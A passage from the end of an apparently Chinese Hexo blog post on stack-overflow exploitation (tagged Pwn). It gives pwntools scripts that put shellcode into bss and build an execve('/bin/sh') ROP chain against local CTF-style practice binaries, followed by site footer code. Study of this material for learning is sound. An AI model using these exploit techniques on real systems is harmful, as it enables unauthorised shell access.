+<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="hljs-string">&apos;./ret2shellcode&apos;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="hljs-number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">&apos;A&apos;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<p>bss&#x53EF;&#x6267;&#x884C;&#x540E;&#xFF0C;&#x628A;shellcode&#x653E;&#x5230;bss&#x6BB5;</p>
+<h4 id="4&#x3001;&#x5229;&#x7528;gadgets&#x6765;getshell"><a href="#4&#x3001;&#x5229;&#x7528;gadgets&#x6765;getshell" class="headerlink" title="4&#x3001;&#x5229;&#x7528;gadgets&#x6765;getshell"></a>4&#x3001;&#x5229;&#x7528;gadgets&#x6765;getshell</h4><p>&#x53EA;&#x8981;&#x6211;&#x4EEC;&#x628A;&#x5BF9;&#x5E94;&#x83B7;&#x53D6; shell &#x7684;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x7684;&#x53C2;&#x6570;&#x653E;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x4E2D;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5728;&#x6267;&#x884C; int 0x80 &#x5C31;&#x53EF;&#x6267;&#x884C;&#x5BF9;&#x5E94;&#x7684;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x3002;&#x6BD4;&#x5982;&#x8BF4;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x5229;&#x7528;&#x5982;&#x4E0B;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x6765;&#x83B7;&#x53D6; shell</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x5176;&#x4E2D;&#xFF0C;&#x8BE5;&#x7A0B;&#x5E8F;&#x662F; 32 &#x4F4D;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4F7F;&#x5F97;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x53F7;&#xFF0C;&#x5373; eax &#x5E94;&#x8BE5;&#x4E3A; 0xb</span><br><span class="line">&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5373; ebx &#x5E94;&#x8BE5;&#x6307;&#x5411; /bin/sh &#x7684;&#x5730;&#x5740;&#xFF0C;&#x5176;&#x5B9E;&#x6267;&#x884C; sh &#x7684;&#x5730;&#x5740;&#x4E5F;&#x53EF;&#x4EE5;&#x3002;</span><br><span class="line">&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5373; ecx &#x5E94;&#x8BE5;&#x4E3A; 0</span><br><span class="line">&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5373; edx &#x5E94;&#x8BE5;&#x4E3A; 0</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x800C;&#x6211;&#x4EEC;&#x5982;&#x4F55;&#x63A7;&#x5236;&#x8FD9;&#x4E9B;&#x5BC4;&#x5B58;&#x5668;&#x7684;&#x503C; &#x5462;&#xFF1F;&#x8FD9;&#x91CC;&#x5C31;&#x9700;&#x8981;&#x4F7F;&#x7528; gadgets&#x3002;&#x6BD4;&#x5982;&#x8BF4;&#xFF0C;&#x73B0;&#x5728;&#x6808;&#x9876;&#x662F; 10&#xFF0C;&#x90A3;&#x4E48;&#x5982;&#x679C;&#x6B64;&#x65F6;&#x6267;&#x884C;&#x4E86;pop eax&#xFF0C;&#x90A3;&#x4E48;&#x73B0;&#x5728; eax &#x7684;&#x503C;&#x5C31;&#x4E3A; 10&#x3002;<br>ps:</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret &#x4E0D;&#x52A0;&#x53C2;&#x6570; &#x76F8;&#x5F53;&#x4E8E; &#x7528;&#x6808;&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4FEE;&#x6539;IP&#x7684;&#x5185;&#x5BB9; pop IP</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line">context.log_level = <span class="hljs-string">&apos;debug&apos;</span></span><br><span class="line">sh = process(<span class="hljs-string">&apos;./rop&apos;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="hljs-number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="hljs-number">0x08049421</span></span><br><span class="line">binsh = <span class="hljs-number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="hljs-string">&apos;A&apos;</span> * <span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh, int_0x80])</span><br><span class="line">print(base64.b16encode(payload))</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="pwntools&#x6253;&#x65AD;&#x70B9;"><a href="#pwntools&#x6253;&#x65AD;&#x70B9;" class="headerlink" title="pwntools&#x6253;&#x65AD;&#x70B9;"></a>pwntools&#x6253;&#x65AD;&#x70B9;</h4><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh = process(<span class="hljs-string">&apos;./stack-example&apos;</span>)</span><br><span class="line">pwnlib.gdb.attach(sh,<span class="hljs-string">&quot;b *0x0804847b&quot;</span>)</span><br></pre></td></tr></tbody></table></figure></body></html>
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Pwn/">#Pwn</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2019/09/18/%E4%BB%8Eret2libc%E4%B8%AD%E5%AD%A6%E4%B9%A0GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%8A%A8%E6%80%81%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB/">从ret2libc中学习GOT表和PLT表以及动态计算偏移</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2019/09/01/Upload-labs/">Upload-labs</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 John Doe&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
+
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("en-AU");
+</script>
+
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
+
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-epsilon2_1"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
